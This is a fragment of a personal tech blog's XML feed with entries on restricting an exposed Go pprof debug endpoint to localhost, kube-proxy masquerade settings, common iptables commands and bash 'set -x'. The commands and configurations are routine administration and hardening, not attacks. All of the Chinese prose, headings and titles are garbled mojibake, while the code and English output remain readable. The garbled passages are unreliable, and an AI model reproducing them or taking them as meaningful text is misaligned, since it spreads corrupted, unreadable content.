é™¤ï¼Œä¾¿å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜~</p><h1 id="è§£å†³æ–¹æ¡ˆ2"><a href="#è§£å†³æ–¹æ¡ˆ2" class="headerlink" title="è§£å†³æ–¹æ¡ˆ2"></a>è§£å†³æ–¹æ¡ˆ2</h1><p>æ­£å¸¸æœåŠ¡ç«¯å£æ”¹ä¸ºhttp.NewServeMux</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241023172345.png" alt="image.png"></p><p>å¯åŠ¨ç¨‹åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">go run perfect/main.go -a=<span class="hljs-string">&quot;0.0.0.0:6030&quot;</span> -b=<span class="hljs-string">&quot;127.0.0.1:6031&quot;</span><br></code></pre></td></tr></table></figure><p>æœ€ç»ˆç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># curl http://192.168.20.201:6030/debug/pprof/goroutine?debug=1</span><br>404 page not found<br>[root@ningan ~]<span class="hljs-comment"># curl http://192.168.20.201:6031/debug/pprof/goroutine?debug=1</span><br>curl: (7) Failed to connect to 192.168.20.201 port 6031: Connection refused<br>[root@ningan ~]<span class="hljs-comment"># curl http://127.0.0.1:6031/debug/pprof/goroutine?debug=1</span><br>goroutine profile: total 4<br>1 @ 0x433911 0x46f09d 0x678b91 0x6789c5 0x6757eb 0x68590f 0x6863fe 0x637489 0x63930d 0x63a34e 0x6360c8 0x474921<br><span class="hljs-comment">#       0x46f09c        runtime/pprof.runtime_goroutineProfileWithLabels+0x1c   /usr/local/go/src/runtime/mprof.go:1079</span><br><span class="hljs-comment">#       0x678b90        runtime/pprof.writeRuntimeProfile+0xb0                  /usr/local/go/src/runtime/pprof/pprof.go:774</span><br><span class="hljs-comment">#       0x6789c4        runtime/pprof.writeGoroutine+0x44                       /usr/local/go/src/runtime/pprof/pprof.go:734</span><br><span class="hljs-comment">#       0x6757ea        runtime/pprof.(*Profile).WriteTo+0x14a                  /usr/local/go/src/runtime/pprof/pprof.go:369</span><br><span class="hljs-comment">#       0x68590e        net/http/pprof.handler.ServeHTTP+0x52e                  /usr/local/go/src/net/http/pprof/pprof.go:267</span><br><span class="hljs-comment">#       0x6863fd        net/http/pprof.Index+0xdd                               /usr/local/go/src/net/http/pprof/pprof.go:384</span><br><span class="hljs-comment">#       0x637488        net/http.HandlerFunc.ServeHTTP+0x28                     /usr/local/go/src/net/http/server.go:2171</span><br><span class="hljs-comment">#       0x63930c        net/http.(*ServeMux).ServeHTTP+0x1ac                    /usr/local/go/src/net/http/server.go:2688</span><br><span class="hljs-comment">#       0x63a34d        net/http.serverHandler.ServeHTTP+0x8d                   /usr/local/go/src/net/http/server.go:3142</span><br><span class="hljs-comment">#       0x6360c7        net/http.(*conn).serve+0x5e7                            /usr/local/go/src/net/http/server.go:2044</span><br><br>1 @ 0x43e1ce 0x436f37 0x46f465 0x4bcb27 0x4bd67a 0x4bd668 0x5657e5 0x56f745 0x6300f7 0x474921<br><span class="hljs-comment">#       0x46f464        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:345</span><br><span class="hljs-comment">#       0x4bcb26        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4bd679        internal/poll.(*pollDesc).waitRead+0x279        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4bd667        internal/poll.(*FD).Read+0x267                  /usr/local/go/src/internal/poll/fd_unix.go:164</span><br><span class="hljs-comment">#       0x5657e4        net.(*netFD).Read+0x24                          /usr/local/go/src/net/fd_posix.go:55</span><br><span class="hljs-comment">#       0x56f744        net.(*conn).Read+0x44                           /usr/local/go/src/net/net.go:185</span><br><span class="hljs-comment">#       0x6300f6        net/http.(*connReader).backgroundRead+0x36      /usr/local/go/src/net/http/server.go:681</span><br><br>1 @ 0x43e1ce 0x436f37 0x46f465 0x4bcb27 0x4be1cc 0x4be1ba 0x5668e9 0x57727e 0x5765d0 0x63a77e 0x63a411 0x68d8e7 0x68d87b 0x43dd7d 0x474921<br><span class="hljs-comment">#       0x46f464        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:345</span><br><span class="hljs-comment">#       0x4bcb26        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4be1cb        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4be1b9        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5668e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x57727d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:159</span><br><span class="hljs-comment">#       0x5765cf        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:327</span><br><span class="hljs-comment">#       0x63a77d        net/http.(*Server).Serve+0x33d                  /usr/local/go/src/net/http/server.go:3260</span><br><span class="hljs-comment">#       0x63a410        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:3189</span><br><span class="hljs-comment">#       0x68d8e6        net/http.ListenAndServe+0x2e6                   /usr/local/go/src/net/http/server.go:3443</span><br><span class="hljs-comment">#       0x68d87a        main.main+0x27a                                 /root/go-practice/chapter58-httpserver/perfect/main.go:36</span><br><span class="hljs-comment">#       0x43dd7c        runtime.main+0x29c                              /usr/local/go/src/runtime/proc.go:271</span><br><br>1 @ 0x43e1ce 0x436f37 0x46f465 0x4bcb27 0x4be1cc 0x4be1ba 0x5668e9 0x57727e 0x5765d0 0x63a77e 0x63a411 0x68daaa 0x68da55 0x474921<br><span class="hljs-comment">#       0x46f464        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:345</span><br><span class="hljs-comment">#       0x4bcb26        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4be1cb        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4be1b9        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5668e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x57727d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:159</span><br><span class="hljs-comment">#       0x5765cf        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:327</span><br><span class="hljs-comment">#       0x63a77d        net/http.(*Server).Serve+0x33d                  /usr/local/go/src/net/http/server.go:3260</span><br><span class="hljs-comment">#       0x63a410        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:3189</span><br><span class="hljs-comment">#       0x68daa9        net/http.ListenAndServe+0x109                   /usr/local/go/src/net/http/server.go:3443</span><br><span class="hljs-comment">#       0x68da54        main.main.func1+0xb4                            /root/go-practice/chapter58-httpserver/perfect/main.go:27</span><br><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>æºç å‚è€ƒï¼š<br><a href="https://github.com/ningan123/go-practice/tree/master/chapter58-httpserver">go-practice&#x2F;chapter58-httpserver at master Â· ningan123&#x2F;go-practice</a></p><p>è§£å†³æ–¹æ¡ˆå‚è€ƒï¼š<br><a href="https://studygolang.com/articles/12568">ä½ çš„ pprof æš´éœ²äº† - Goè¯­è¨€ä¸­æ–‡ç½‘ - Golangä¸­æ–‡ç¤¾åŒº</a></p><p>æ·±å…¥å‰–æå‚è€ƒï¼š<br><a href="https://darjun.github.io/2021/07/13/in-post/godailylib/nethttp/">Go æ¯æ—¥ä¸€åº“ä¹‹ net&#x2F;httpï¼ˆåŸºç¡€å’Œä¸­é—´ä»¶ï¼‰ - å¤§ä¿Šçš„åšå®¢</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€vscodeã€‘(202409) vscodeä¸­ä¿®æ”¹go formaté…ç½®</title>
    <link href="/2024/09/26/software/%E3%80%90vscode%E3%80%91(202409)%20vscode%E4%B8%AD%E4%BF%AE%E6%94%B9go%20format%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/09/26/software/%E3%80%90vscode%E3%80%91(202409)%20vscode%E4%B8%AD%E4%BF%AE%E6%94%B9go%20format%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240926180108.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘kube-proxyå‚æ•°</title>
    <link href="/2024/08/30/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kube-proxy%E5%8F%82%E6%95%B0/"/>
    <url>/2024/08/30/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kube-proxy%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ“ä½œæµç¨‹</span><br>systemctl stop kube-proxy<br>iptables -F -t nat<br>iptables -t nat -L -n -v<br>vi /root/bink8s/cfg/kube-proxy-bootstrap.config<br><span class="hljs-built_in">cat</span> /root/bink8s/cfg/kube-proxy-bootstrap.config <br>iptables -t nat -L -n -v<br>systemctl start kube-proxy<br>iptables -t nat -L -n -v<br><br></code></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830143908.png" alt="image.png"></p><h1 id="ç†è®ºè¯´æ˜"><a href="#ç†è®ºè¯´æ˜" class="headerlink" title="ç†è®ºè¯´æ˜"></a>ç†è®ºè¯´æ˜</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><a href="https://kubernetes.io/docs/reference/config-api/kube-proxy-config.v1alpha1/">kube-proxy Configuration (v1alpha1) | Kubernetes</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830154027.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables:<br>  masqueradeAll: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830154401.png" alt="image.png"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>kube-proxy  --masquerade-all=<span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure><h1 id="æˆªå›¾è®°å½•"><a href="#æˆªå›¾è®°å½•" class="headerlink" title="æˆªå›¾è®°å½•"></a>æˆªå›¾è®°å½•</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830142151.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830142206.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830142821.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830142804.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830143144.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830143356.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830144029.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830143951.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘(202408) iptableså¸¸ç”¨å‘½ä»¤</title>
    <link href="/2024/08/29/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202408)%20iptables%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2024/08/29/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202408)%20iptables%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t filter -L -n<br><br>iptables -t filter -A INPUT -j DROP -p tcp --dport 8081<br><span class="hljs-comment"># 1è¡¨ç¤ºç¬¬1æ¡ -Dè¡¨ç¤ºåˆ é™¤</span><br>iptables -t filter -D INPUT 1 <br><br><span class="hljs-comment"># ä¼šæ–­æ‰å½“å‰çš„ssh</span><br>iptables -t filter -A OUTPUT -j DROP -p tcp --d x.x.x.x  <br><br><br><br>PRE æ”¹ç›®çš„åœ°å€<br>POST æ”¹æº<br><br><br><br>æŒ‰ç…§é¡ºåºåŒ¹é…ï¼Œæœ€ç»ˆåŒ¹é…ä¸åˆ°çš„ä¼šæŒ‰ç…§é»˜è®¤policyèµ°<br><br><span class="hljs-comment"># è‡ªå®šä¹‰é“¾</span><br>iptables -N mychain<br><span class="hljs-comment"># åˆ é™¤è‡ªå®šä¹‰é“¾</span><br>iptables -X mychain<br><br>iptables -F <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_31977125/article/details/124208384">iptables -j MARK â€“set-xmark è§£æ_iptables â€“set-xmark-CSDNåšå®¢</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">???? <br><span class="hljs-comment"># åˆå§‹ --set-xmark 0x4000/0x4000 ï¼ˆè¿™é‡Œå°±ä¸è½¬2è¿›åˆ¶äº†ï¼‰</span><br><span class="hljs-comment"># ä¹‹å --set-xmark 0x4000/0x0</span><br>å…ˆçœ‹æ©ç 0x0ï¼Œç­‰äºæ²¡æœ‰ã€‚æ‰€ä»¥ç¬¬ä¸€æ­¥è®¡ç®—å®Œè¿˜æ˜¯0x4000<br>ç¬¬äºŒæ­¥ï¼Œ0x4000ä¸0x4000å¼‚æˆ–ï¼Œä¸¤ä¸ªå€¼æ‰€æœ‰ä½éƒ½ç›¸ç­‰ã€‚æ‰€ä»¥å¼‚æˆ–å®Œçš„ç»“æœæ˜¯å…¨0ï¼Œå…¨0å°±ä»£è¡¨æ²¡æœ‰markã€‚<br>æ‰€ä»¥ --set-xmark 0x4000/0x0è¿™ä¸ªé…ç½®ç›¸å½“äºæŠŠç¬¬ä¸€æ­¥è®¾ç½®çš„ctmark  (0x4000/0x4000)æ¸…é™¤äº†ã€‚<br><br></code></pre></td></tr></table></figure><h1 id="æ–‡å¿ƒä¸€è¨€"><a href="#æ–‡å¿ƒä¸€è¨€" class="headerlink" title="æ–‡å¿ƒä¸€è¨€"></a>æ–‡å¿ƒä¸€è¨€</h1><h2 id="iptables-Zæ˜¯ä»€ä¹ˆæ„æ€"><a href="#iptables-Zæ˜¯ä»€ä¹ˆæ„æ€" class="headerlink" title="iptables -Zæ˜¯ä»€ä¹ˆæ„æ€"></a>iptables -Zæ˜¯ä»€ä¹ˆæ„æ€</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">åœ¨`iptables`ä¸­ï¼Œ`-Z`Â æˆ–Â `--zero`Â é€‰é¡¹ç”¨äºå°†æŒ‡å®šé“¾ï¼ˆchainï¼‰æˆ–æ‰€æœ‰é“¾ä¸­çš„è®¡æ•°å™¨å½’é›¶ã€‚è¿™äº›è®¡æ•°å™¨è·Ÿè¸ªäº†æ¯ä¸ªè§„åˆ™åŒ¹é…çš„æ•°æ®åŒ…æ•°é‡å’Œå­—èŠ‚æ•°ã€‚é€šè¿‡å½’é›¶è¿™äº›è®¡æ•°å™¨ï¼Œä½ å¯ä»¥é‡ç½®å®ƒä»¬ï¼Œä»¥ä¾¿é‡æ–°å¼€å§‹è·Ÿè¸ªï¼Œç‰¹åˆ«æ˜¯åœ¨ä½ å¸Œæœ›é‡æ–°è¯„ä¼°è§„åˆ™çš„æ•ˆç‡æˆ–è°ƒè¯•æ–°è§„åˆ™æ—¶éå¸¸æœ‰ç”¨ã€‚<br><br>ä½¿ç”¨`-Z`é€‰é¡¹æ—¶ï¼Œä½ å¯ä»¥æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªé“¾åï¼Œå¦‚æœä¸æŒ‡å®šé“¾åï¼Œåˆ™é»˜è®¤å°†æ‰€æœ‰é“¾çš„è®¡æ•°å™¨å½’é›¶ã€‚<br></code></pre></td></tr></table></figure><h2 id="iptables-Få’Œ-Xçš„åŒºåˆ«åŒºåˆ«æ€»ç»“"><a href="#iptables-Få’Œ-Xçš„åŒºåˆ«åŒºåˆ«æ€»ç»“" class="headerlink" title="iptables -Få’Œ-Xçš„åŒºåˆ«åŒºåˆ«æ€»ç»“"></a>iptables -Få’Œ-Xçš„åŒºåˆ«åŒºåˆ«æ€»ç»“</h2><ul><li><strong>æ“ä½œå¯¹è±¡</strong>ï¼š<code>-F</code>æ“ä½œçš„æ˜¯é“¾å†…çš„è§„åˆ™ï¼Œè€Œ<code>-X</code>æ“ä½œçš„æ˜¯é“¾æœ¬èº«ï¼ˆä½†ä»…é™äºè‡ªå®šä¹‰é“¾ï¼‰ã€‚</li><li><strong>æ•ˆæœ</strong>ï¼š<code>-F</code>æ¸…ç©ºé“¾å†…è§„åˆ™ä½†ä¸åˆ é™¤é“¾ï¼Œ<code>-X</code>åˆ é™¤è‡ªå®šä¹‰é“¾åŠå…¶è§„åˆ™ã€‚</li><li><strong>é™åˆ¶</strong>ï¼š<code>-F</code>å¯ä»¥åº”ç”¨äºå†…ç½®é“¾å’Œè‡ªå®šä¹‰é“¾ï¼Œä½†<code>-X</code>åªèƒ½åº”ç”¨äºè‡ªå®šä¹‰é“¾ï¼Œä¸”è¯¥é“¾å¿…é¡»ä¸ºç©ºï¼ˆä¸åŒ…å«ä»»ä½•è§„åˆ™ï¼‰æ‰èƒ½è¢«åˆ é™¤ã€‚</li></ul><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><h2 id="iptables-h"><a href="#iptables-h" class="headerlink" title="iptables -h"></a>iptables -h</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># iptables -h</span><br>iptables v1.8.7<br><br>Usage: iptables -[ACD] chain rule-specification [options]<br>        iptables -I chain [rulenum] rule-specification [options]<br>        iptables -R chain rulenum rule-specification [options]<br>        iptables -D chain rulenum [options]<br>        iptables -[LS] [chain [rulenum]] [options]<br>        iptables -[FZ] [chain] [options]<br>        iptables -[NX] chain<br>        iptables -E old-chain-name new-chain-name<br>        iptables -P chain target [options]<br>        iptables -h (<span class="hljs-built_in">print</span> this <span class="hljs-built_in">help</span> information)<br><br>Commands:<br>Either long or short options are allowed.<br>  --append  -A chain            Append to chain<br>  --check   -C chain            Check <span class="hljs-keyword">for</span> the existence of a rule<br>  --delete  -D chain            Delete matching rule from chain<br>  --delete  -D chain rulenum<br>                                Delete rule rulenum (1 = first) from chain<br>  --insert  -I chain [rulenum]<br>                                Insert <span class="hljs-keyword">in</span> chain as rulenum (default 1=first)<br>  --replace -R chain rulenum<br>                                Replace rule rulenum (1 = first) <span class="hljs-keyword">in</span> chain<br>  --list    -L [chain [rulenum]]<br>                                List the rules <span class="hljs-keyword">in</span> a chain or all chains<br>  --list-rules -S [chain [rulenum]]<br>                                Print the rules <span class="hljs-keyword">in</span> a chain or all chains<br>  --flush   -F [chain]          Delete all rules <span class="hljs-keyword">in</span>  chain or all chains<br>  --zero    -Z [chain [rulenum]]<br>                                Zero counters <span class="hljs-keyword">in</span> chain or all chains<br>  --new     -N chain            Create a new user-defined chain<br>  --delete-chain<br>             -X [chain]         Delete a user-defined chain<br>  --policy  -P chain target<br>                                Change policy on chain to target<br>  --rename-chain<br>             -E old-chain new-chain<br>                                Change chain name, (moving any references)<br>Options:<br>    --ipv4      -4              Nothing (line is ignored by ip6tables-restore)<br>    --ipv6      -6              Error (line is ignored by iptables-restore)<br>[!] --proto     -p proto        protocol: by number or name, eg. `tcp<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[!] --source    -s address[/mask][...]</span><br><span class="hljs-string">                                source specification</span><br><span class="hljs-string">[!] --destination -d address[/mask][...]</span><br><span class="hljs-string">                                destination specification</span><br><span class="hljs-string">[!] --in-interface -i input name[+]</span><br><span class="hljs-string">                                network interface name ([+] for wildcard)</span><br><span class="hljs-string"> --jump -j target</span><br><span class="hljs-string">                                target for rule (may load target extension)</span><br><span class="hljs-string">  --goto      -g chain</span><br><span class="hljs-string">                               jump to chain with no return</span><br><span class="hljs-string">  --match       -m match</span><br><span class="hljs-string">                                extended match (may load extension)</span><br><span class="hljs-string">  --numeric     -n              numeric output of addresses and ports</span><br><span class="hljs-string">[!] --out-interface -o output name[+]</span><br><span class="hljs-string">                                network interface name ([+] for wildcard)</span><br><span class="hljs-string">  --table       -t table        table to manipulate (default: `filter&#x27;</span>)<br>  --verbose     -v              verbose mode<br>  --<span class="hljs-built_in">wait</span>        -w [seconds]    maximum <span class="hljs-built_in">wait</span> to acquire xtables lock before give up<br>  --wait-interval -W [usecs]    <span class="hljs-built_in">wait</span> time to try to acquire xtables lock<br>                                default is 1 second<br>  --line-numbers                <span class="hljs-built_in">print</span> line numbers when listing<br>  --exact       -x              <span class="hljs-built_in">expand</span> numbers (display exact values)<br>[!] --fragment  -f              match second or further fragments only<br>  --modprobe=&lt;<span class="hljs-built_in">command</span>&gt;          try to insert modules using this <span class="hljs-built_in">command</span><br>  --set-counters PKTS BYTES     <span class="hljs-built_in">set</span> the counter during insert/append<br>[!] --version   -V              <span class="hljs-built_in">print</span> package version.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202408) set</title>
    <link href="/2024/08/26/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202408)%20set/"/>
    <url>/2024/08/26/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202408)%20set/</url>
    
    <content type="html"><![CDATA[<h1 id="set-x"><a href="#set-x" class="headerlink" title="set -x"></a>set -x</h1><h2 id="ä½¿ç”¨æ–¹å¼1"><a href="#ä½¿ç”¨æ–¹å¼1" class="headerlink" title="ä½¿ç”¨æ–¹å¼1"></a>ä½¿ç”¨æ–¹å¼1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># cat a.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;111&quot;</span><br><br>[root@ningan ~]<span class="hljs-comment"># set -x; ./a.sh</span><br>+ ./a.sh<br>111<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨æ–¹å¼2"><a href="#ä½¿ç”¨æ–¹å¼2" class="headerlink" title="ä½¿ç”¨æ–¹å¼2"></a>ä½¿ç”¨æ–¹å¼2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># cat b.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -x<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;111&quot;</span><br><br>[root@ningan ~]<span class="hljs-comment"># ./b.sh </span><br>+ <span class="hljs-built_in">echo</span> 111<br>111<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdã€‘(202408) 06.kubeletã€containerdã€runcã€å®¹å™¨ä¹‹é—´çš„å…³ç³»</title>
    <link href="/2024/08/22/containerd/%E3%80%90containerd%E3%80%91(202408)%2006.kubelet%E3%80%81containerd%E3%80%81runc%E3%80%81%E5%AE%B9%E5%99%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
